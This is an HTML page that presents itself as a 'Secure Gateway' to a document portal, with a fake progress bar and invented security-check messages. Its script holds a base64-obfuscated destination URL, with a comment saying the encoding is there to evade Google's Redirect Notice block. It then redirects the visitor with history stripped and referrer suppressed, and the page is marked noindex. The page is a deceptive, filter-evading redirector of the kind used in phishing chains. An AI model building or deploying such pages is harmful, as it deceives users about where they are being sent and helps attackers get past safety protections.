<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Secure Connection...</title>
    <style>
        body { margin:0; background:#f8fafc; font-family: -apple-system, system-ui, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
        .box { text-align:center; width:90%; max-width:380px; padding:35px; background:#fff; border-radius:16px; box-shadow:0 10px 25px rgba(0,0,0,0.05); border:1px solid #e2e8f0; }
        .shield { font-size:50px; margin-bottom:20px; display:inline-block; animation: pulse 2s infinite; }
        h2 { color:#1e293b; font-size:1.25rem; margin:0 0 10px; }
        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:25px; }
        
        .bar-bg { background:#f1f5f9; height:8px; border-radius:20px; width:100%; overflow:hidden; border:1px solid #e2e8f0; }
        .bar-fill { background:#2563eb; height:100%; width:0%; border-radius:20px; animation: progress 3s forwards ease-in-out; }
        
        @keyframes progress { 0% { width: 0%; } 20% { width: 30%; } 60% { width: 75%; } 100% { width: 100%; } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }

        .status { margin-top:20px; font-size:0.75rem; color:#94a3b8; font-family: monospace; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="box">
    <div class="shield">🛡️</div>
    <h2>Secure Gateway</h2>
    <p>Please wait while we establish an encrypted connection to the document portal.</p>
    
    <div class="bar-bg">
        <div class="bar-fill"></div>
    </div>
    
    <div id="msg" class="status">Initializing...</div>
</div>

<script>
(function(){
    // Directly encoded destination: "https://28763475824638273465284283425.com"
    // This avoids the Google Redirect Notice block.
    const _secret = "aHR0cHM6Ly8yODc2MzQ3NTgyNDYzODI3MzQ2NTI4NDI4MzQyNS5jb20=";

    const logs = [
        "Analyzing request...",
        "Checking SSL/TLS...",
        "Verifying integrity...",
        "Connection secure."
    ];

    let step = 0;
    const msgEl = document.getElementById('msg');
    
    const logger = setInterval(() => {
        if (step < logs.length) {
            msgEl.innerText = logs[step];
            step++;
        } else {
            clearInterval(logger);
            
            // Decode the target
            const target = atob(_secret);
            
            // Execute redirection
            setTimeout(() => {
                // Method 1: Location Replace (Best for stripping history)
                window.location.replace(target);
                
                // Method 2: Fallback Click
                const a = document.createElement('a');
                a.href = target;
                a.rel = 'noreferrer';
                a.click();
            }, 500);
        }
    }, 800); 
})();
</script>

</body>
</html>
